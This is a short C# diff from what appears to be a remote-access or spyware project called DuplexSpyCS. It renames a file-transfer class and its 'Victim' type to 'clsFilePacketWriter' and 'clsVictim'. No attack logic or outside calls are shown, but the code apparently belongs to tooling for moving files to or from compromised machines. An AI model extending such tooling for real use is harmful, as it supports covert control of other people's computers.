@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace DuplexSpyCS
 {
-    public class FilePacketWriter
+    public class clsFilePacketWriter
     {
         private readonly string file_path;
         private string remote_file;
@@ -16,9 +16,9 @@ namespace DuplexSpyCS
         private bool is_processing;
         public long file_bytes = 0;
         private long file_len;
-        private Victim v;
+        private clsVictim v;
 
-        public FilePacketWriter(string file_path, string remote_file, long file_len, Victim v)
+        public clsFilePacketWriter(string file_path, string remote_file, long file_len, clsVictim v)
         {
             this.file_path = file_path;
             this.file_len = file_len;
